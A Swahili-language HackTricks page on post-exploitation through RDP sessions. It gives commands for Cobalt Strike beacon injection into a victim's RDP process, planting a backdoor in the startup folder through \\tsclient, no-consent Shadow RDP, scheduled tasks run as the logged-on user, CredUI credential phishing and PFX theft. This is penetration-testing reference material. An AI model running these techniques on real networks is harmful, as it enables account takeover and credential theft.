# Matumizi Mabaya ya Vikao vya RDP

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Ikiwa **kundi la nje** lina **ufikiaji wa RDP** kwenye **kompyuta** katika domain ya sasa, mshambuliaji anayeingilia kompyuta hiyo anaweza kusubiri hadi mwanachama wa kundi hilo aunganishe.

Mtumiaji akishaunganisha kupitia RDP, **mshambuliaji anaweza kuhamia kwenye session ya mtumiaji huyo** na kutumia vibaya ruhusa za mtumiaji huyo katika domain ya nje.

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

Angalia **njia nyingine za kuiba sessions kwa kutumia tools nyingine** [**kwenye ukurasa huu.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## Cross-Session Authentication Relay

**Console session au RDP session inayotumika** na mtumiaji mwingine wa domain pia inaweza kuwa kidokezo ikiwa una shell yenye privileges za chini kwenye host hiyo hiyo. Uamilishaji wa DCOM kati ya sessions unaweza kusababisha COM server inayofaa katika session hiyo shirikishi kufanya authentication, na tools kama RemotePotato0 au KrbRelay zinaweza kunasa au ku-relay authentication hiyo. Si lazima mtumiaji aliyeingia awe domain administrator: haki ya directory yenye upeo finyu, kama ruhusa ya kusoma managed password ya gMSA, inaweza kutosha kwa pivot nyingine.<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

Anza na session ID na utambulisho kutoka `query user`, `qwinsta`, au orodha ya sessions iliyopo ya winPEAS. Zichukulie kama **wagombea**, si uthibitisho wa njia ya relay. COM class, viwango vyake vya impersonation na authentication, ufikikaji wa session, uelekezaji wa firewall/OXID, ulinzi wa protocol lengwa, na haki halisi za principal aliyeingia—vyote ni muhimu. KrbRelay inaandika mifano ya LDAP, HTTP, SMB, na NTLM ya cross-session, lakini njia hizi hutegemea version na configuration. LDAP channel binding pia ni kizuizi kingine cha relay upande wa lengo. Hasa, mradi wa RemotePotato0 unasema kuwa hali yake ya awali ya exploit ya RPC-to-LDAP ilirekebishwa mwaka 2022; usihitimishe kuwa LDAP relay itafanikiwa kwa kuona session pekee.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

Mtumiaji akiingia kwenye mashine kupitia **RDP** huku **attacker** **akimsubiri**, attacker ataweza **kuingiza beacon kwenye RDP session ya mtumiaji**; na ikiwa **victim ali-mount drive yake** wakati wa kuingia kupitia RDP, **attacker anaweza kuifikia**.

Katika hali hii unaweza tu **ku-compromise** **kompyuta ya awali ya victim** kwa kuandika **backdoor** kwenye **startup folder**.

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

Ikiwa wewe ni **local admin** kwenye host ambayo victim tayari ana **active RDP session**, unaweza kuweza **kuona/kudhibiti desktop hiyo bila kuiba password au kudump LSASS**.<sup>[[1]](#references)</sup>

Hili hutegemea policy ya **Remote Desktop Services shadowing** iliyohifadhiwa kwenye:<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

Thamani za kuvutia:

- `0`: Imezimwa
- `1`: `EnableInputNotify` (udhibiti, idhini ya mtumiaji inahitajika)
- `2`: `EnableInputNoNotify` (udhibiti, **hakuna idhini ya mtumiaji**)
- `3`: `EnableNoInputNotify` (kutazama pekee, idhini ya mtumiaji inahitajika)
- `4`: `EnableNoInputNoNotify` (kutazama pekee, **hakuna idhini ya mtumiaji**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

Hili ni muhimu hasa pale mtumiaji mwenye haki za juu aliyeunganishwa kupitia RDP anapoacha desktop isiyofungwa, session ya KeePass, console ya MMC, session ya browser, au shell ya admin ikiwa wazi.

## Scheduled Tasks As Logged-On User

Ikiwa wewe ni **local admin** na mtumiaji lengwa **ameingia kwa sasa**, Task Scheduler inaweza kuanzisha code **kama mtumiaji huyo bila nenosiri lake**.<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

Hii hugeuza session iliyopo ya mwathiriwa ya kuingia kuwa primitive ya utekelezaji:

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

Maelezo:

- Ikiwa mtumiaji **hajaingia**, Windows kwa kawaida huhitaji nenosiri ili kuunda task inayoendeshwa kama mtumiaji huyo.
- Ikiwa mtumiaji **ameingia**, task inaweza kutumia tena muktadha uliopo wa kuingia.
- Hii ni njia ya kutekeleza vitendo vya GUI au kuzindua binaries ndani ya session ya mwathiriwa bila kugusa LSASS.

## Matumizi Mabaya ya Kidokezo cha CredUI Kutoka Kwenye Session ya Mwathiriwa

Ukiweza kutekeleza **ndani ya desktop shirikishi ya mwathiriwa** (kwa mfano kupitia **Shadow RDP** au **scheduled task inayoendeshwa kama mtumiaji huyo**), unaweza kuonyesha **kidokezo halisi cha Windows cha kuingiza credentials** kwa kutumia CredUI APIs na kuvuna credentials anazoingiza mwathiriwa.<sup>[[1]](#references)</sup>

APIs zinazohusika:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Mtiririko wa kawaida:

1. Anzisha binary ndani ya session ya mwathiriwa.
2. Onyesha kidokezo cha uthibitishaji wa domain kinacholingana na chapa ya domain ya sasa.
3. Fumbua auth buffer iliyorejeshwa.
4. Thibitisha credentials zilizotolewa na, kwa hiari, endelea kuonyesha kidokezo hadi credentials halali ziingizwe.

Hii ni muhimu kwa **phishing kwenye host** kwa sababu kidokezo kinaonyeshwa na Windows APIs za kawaida badala ya fomu bandia ya HTML.

## Kuomba PFX Katika Muktadha wa Mwathiriwa

Mbinu hiyo hiyo ya **scheduled-task-as-user** inaweza kutumika kuomba **certificate/PFX kama mwathiriwa aliyeingia**. Certificate hiyo inaweza kutumiwa baadaye kwa **uthibitishaji wa AD** kama mtumiaji huyo, hivyo kuepuka kabisa wizi wa nenosiri.<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

Mtiririko wa juu juu:

1. Pata **local admin** kwenye host ambayo mwathiriwa ameingia.
2. Endesha mantiki ya enrollment/export kama mwathiriwa kwa kutumia **scheduled task**.
3. Export PFX iliyopatikana.
4. Tumia PFX kwa PKINIT / uthibitishaji wa AD unaotegemea certificate.

Angalia kurasa za AD CS kwa matumizi mabaya yanayofuata:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - Kutoka kwenye mitandao tambarare hadi kwenye domains zilizofungwa kwa kutumia tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – Chaguo za `mstsc` za shadow-session](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - Ombi la PR #465 la Shadow RDP plugin](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - Moduli ya schtask_as](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Ombi la PR #908 la kuomba PFX kupitia scheduled task](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - Uanzishaji wa DCOM kati ya sessions na vikwazo vya sasa](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - Mifano ya relay kati ya sessions na mahitaji ya CLSID](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - Amri ya query session](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - Sifa ya ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - LDAP channel binding na ulinzi dhidi ya relay](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
